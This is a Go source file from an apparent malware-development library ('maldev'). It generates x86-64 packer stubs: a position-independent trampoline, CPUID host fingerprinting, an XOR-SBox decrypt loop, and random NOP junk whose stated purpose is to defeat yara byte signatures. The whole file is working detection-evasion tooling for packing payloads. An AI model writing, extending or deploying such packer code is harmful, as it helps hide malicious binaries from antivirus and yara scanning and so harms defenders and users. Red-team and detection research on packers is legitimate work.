package packer

import (
	"fmt"
	mathrand "math/rand"

	"github.com/oioio-space/maldev/pe/packer/stubgen/amd64"
)

// slotARngSeedMask is XORed with the operator seed to derive an
// independent rng for slot A (post-Encode byte splice). Slots B and C
// use the raw seed directly. Stepping the two rngs independently
// means adding a fourth slot later won't reshuffle the byte choices
// for slots A/B/C — operators who pin reproducible packs (e.g. for
// red-team artefact provenance) keep getting the same bytes from
// pre-existing slots when a new slot lands. The exact mask value is
// not security-relevant; any non-zero 64-bit constant decorrelates
// the two rng streams. 0x5a5a… is a recognisable IBCC-style ramp.
const slotARngSeedMask int64 = 0x5a5a5a5a5a5a5a5a

// splitSeedRngs derives independent rngs for in-Builder slots (bRng,
// for slots B and C) and the post-Encode byte-splice slot (aRng).
// seed == 0 returns (nil, nil) — deterministic no-junk emission.
// Both rngs use [math/rand], which is fine here: the slot bytes are
// inert NOPs whose only purpose is to perturb yara byte hashes, not
// to resist key-recovery.
func splitSeedRngs(seed int64) (bRng, aRng *mathrand.Rand) {
	if seed == 0 {
		return nil, nil
	}
	return mathrand.New(mathrand.NewSource(seed)),
		mathrand.New(mathrand.NewSource(seed ^ slotARngSeedMask))
}

// bundleStubPICImmPos is the byte offset of the imm32 immediate in
// the PIC trampoline emitted by [emitBundlePICTrampoline]. Operators
// patch this position post-encode with the distance from the .pic
// label to the bundle base. Mirrors [bundleOffsetImm32Pos] but lives
// next to the emitter for locality.
const bundleStubPICImmPos = 10

// emitBundlePICTrampoline emits the canonical 14-byte position-
// independent prologue shared by every V2-family stub:
//
//	call .pic              ; e8 00 00 00 00  — push next-instr addr
//	pop  r15               ; 41 5f            — read it into R15
//	add  r15, imm32        ; 49 81 c7 …      — patched post-encode
//
// The imm32 placeholder is zero; the wrap layer rewrites it via
// bundleStubPICImmPos. Returns the imm32 offset so callers can
// thread it back to their own immPos return value (kept for API
// symmetry with the pre-extraction code).
func emitBundlePICTrampoline(b *amd64.Builder) (int, error) {
	if err := b.RawBytes([]byte{
		0xe8, 0x00, 0x00, 0x00, 0x00, // call .pic
		0x41, 0x5f, // pop r15
		0x49, 0x81, 0xc7, 0x00, 0x00, 0x00, 0x00, // add r15, imm32
	}); err != nil {
		return 0, fmt.Errorf("packer: PIC trampoline: %w", err)
	}
	return bundleStubPICImmPos, nil
}

// emitCPUIDVendorPrologue emits the 12-byte CPUID-leaf-0 vendor read
// into a 16-byte stack scratch and pins the scratch pointer in RSI:
//
//	sub  rsp, 16
//	mov  rdi, rsp
//	xor  eax, eax
//	cpuid                                    ; EAX=0 → EBX,EDX,ECX
//	mov  [rdi+0],  ebx                       ; "Genu" / "Auth" / …
//	mov  [rdi+4],  edx
//	mov  [rdi+8],  ecx
//	mov  rsi, rdi                            ; vendor pointer
//
// Shared by every V2-family stub (Linux + Windows). Leaves the
// upper 4 bytes of the scratch slot unused — [emitCPUIDFeaturesProbe]
// fills them with CPUID[1].ECX immediately after.
func emitCPUIDVendorPrologue(b *amd64.Builder) error {
	if err := b.SUB(amd64.RSP, amd64.Imm(16)); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue sub rsp: %w", err)
	}
	if err := b.MOV(amd64.RDI, amd64.RSP); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue mov rdi rsp: %w", err)
	}
	if err := b.XOR(amd64.RAX, amd64.RAX); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue xor eax: %w", err)
	}
	if err := b.RawBytes([]byte{0x0f, 0xa2}); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue cpuid: %w", err)
	}
	if err := b.MOVL(amd64.MemOp{Base: amd64.RDI}, amd64.RBX); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue mov [rdi] ebx: %w", err)
	}
	if err := b.MOVL(amd64.MemOp{Base: amd64.RDI, Disp: 4}, amd64.RDX); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue mov [rdi+4] edx: %w", err)
	}
	if err := b.MOVL(amd64.MemOp{Base: amd64.RDI, Disp: 8}, amd64.RCX); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue mov [rdi+8] ecx: %w", err)
	}
	if err := b.MOV(amd64.RSI, amd64.RDI); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue mov rsi rdi: %w", err)
	}
	return nil
}

// emitCPUIDFeaturesProbe emits CPUID-leaf-1 (feature flags) and
// stashes ECX at [rdi+12]:
//
//	mov  eax, 1                              ; CPUID leaf 1
//	cpuid                                    ; EAX,EBX,ECX,EDX
//	mov  [rdi+12], ecx                       ; ECX = feature flags 1
//
// Reads PT_CPUID_FEATURES inputs — the 4-byte slot lives in the
// unused tail of the 16-byte stack scratch allocated by
// [emitCPUIDVendorPrologue]. Must be called AFTER the vendor
// prologue (relies on RDI still pointing at the scratch).
func emitCPUIDFeaturesProbe(b *amd64.Builder) error {
	if err := b.RawBytes([]byte{0xb8, 0x01, 0x00, 0x00, 0x00}); err != nil {
		return fmt.Errorf("packer: CPUID features probe mov eax 1: %w", err)
	}
	if err := b.RawBytes([]byte{0x0f, 0xa2}); err != nil {
		return fmt.Errorf("packer: CPUID features probe cpuid: %w", err)
	}
	if err := b.MOVL(amd64.MemOp{Base: amd64.RDI, Disp: 12}, amd64.RCX); err != nil {
		return fmt.Errorf("packer: CPUID features probe mov [rdi+12] ecx: %w", err)
	}
	return nil
}

// emitBundleLoopSetup emits the per-stub scan-loop initialiser:
//
//	movzx ecx, word [r15+6]   ; entry count (BundleHeader.Count)
//	mov   r8d, [r15+8]        ; entries RVA (relative to bundle base)
//	add   r8,  r15            ; → absolute entries pointer
//	xor   eax, eax            ; loop counter
//
// Reads the FingerprintEntry table location from the BundleHeader
// (R15 already points at the bundle base, set up by the PIC
// trampoline + post-encode imm32 patch). Shared by V2-Negate and
// V2NW; bytes are identical.
func emitBundleLoopSetup(b *amd64.Builder) error {
	if err := b.MOVZWL(amd64.RCX, amd64.MemOp{Base: amd64.R15, Disp: 6}); err != nil {
		return fmt.Errorf("packer: loop setup movzx ecx: %w", err)
	}
	if err := b.MOVL(amd64.R8, amd64.MemOp{Base: amd64.R15, Disp: 8}); err != nil {
		return fmt.Errorf("packer: loop setup mov r8d: %w", err)
	}
	if err := b.ADD(amd64.R8, amd64.R15); err != nil {
		return fmt.Errorf("packer: loop setup add r8 r15: %w", err)
	}
	if err := b.XOR(amd64.RAX, amd64.RAX); err != nil {
		return fmt.Errorf("packer: loop setup xor eax: %w", err)
	}
	return nil
}

// emitNopJunk emits a small random sequence of Intel multi-byte NOPs
// directly into the Builder stream. Used for in-stub polymorphism
// slots (B and C) in V2-family bundle stubs — yara byte-pattern
// signatures across packs differ even when the algorithmic body is
// identical. Caller-supplied rng for test determinism; nil rng emits
// zero bytes (no-op). Total inserted: [4, 16) bytes per call — small
// enough that slots B and C together stay under one cacheline of
// stub-size overhead while still spanning a single yara hit window.
//
// Distinct from [injectStubJunk] which performs a post-Encode byte
// splice at slot A (offset 14). emitNopJunk runs DURING Builder
// emission, so any forward Jcc displacements crossing the junk are
// auto-resolved by Builder's label resolver — no offset bookkeeping
// required.
func emitNopJunk(b *amd64.Builder, r *mathrand.Rand) error {
	if r == nil {
		return nil
	}
	target := 4 + r.Intn(12) // [4, 16)
	junk := make([]byte, 0, target)
	for len(junk) < target {
		remaining := target - len(junk)
		maxSize := remaining
		if maxSize > len(intelNops) {
			maxSize = len(intelNops)
		}
		size := 1 + r.Intn(maxSize)
		junk = append(junk, intelNops[size-1]...)
	}
	if err := b.RawBytes(junk); err != nil {
		return fmt.Errorf("packer: emit nop junk: %w", err)
	}
	return nil
}

// emitDecryptStep emits the 6-instruction SBox-indirection decrypt
// step used by every V2-family bundle stub (plain V2, V2-Negate,
// V2NW). The block consumes one ciphertext byte at [rdi], folds the
// round index in r9b through a 16-entry SBox at [r8], and writes the
// plaintext back. The exact Intel-syntax sequence:
//
//	mov   al, [rdi]
//	mov   dl, r9b
//	and   dl, 15            ; SBox is 16 entries
//	movzx edx, dl
//	xor   al, [r8+rdx]
//	mov   [rdi], al
//
// The 17-byte output is byte-identical to the pre-#2.1 RawBytes blob
// it replaces — encoder unit tests in pe/packer/stubgen/amd64 pin the
// emission for each of the 6 calls.
func emitDecryptStep(b *amd64.Builder) error {
	emit := func(op string, err error) error {
		if err != nil {
			return fmt.Errorf("packer: decrypt step %s: %w", op, err)
		}
		return nil
	}
	if err := emit("mov al [rdi]", b.MOVBReg(amd64.RAX, amd64.MemOp{Base: amd64.RDI})); err != nil {
		return err
	}
	if err := emit("mov dl r9b", b.MOVBReg(amd64.RDX, amd64.R9)); err != nil {
		return err
	}
	if err := emit("and dl 15", b.ANDB(amd64.RDX, amd64.Imm(0x0f))); err != nil {
		return err
	}
	if err := emit("movzx edx dl", b.MOVZBL(amd64.RDX, amd64.RDX)); err != nil {
		return err
	}
	if err := emit("xor al [r8+rdx]", b.XORB(amd64.RAX, amd64.MemOp{Base: amd64.R8, Index: amd64.RDX, Scale: 1})); err != nil {
		return err
	}
	if err := emit("mov [rdi] al", b.MOVB(amd64.MemOp{Base: amd64.RDI}, amd64.RAX)); err != nil {
		return err
	}
	return nil
}
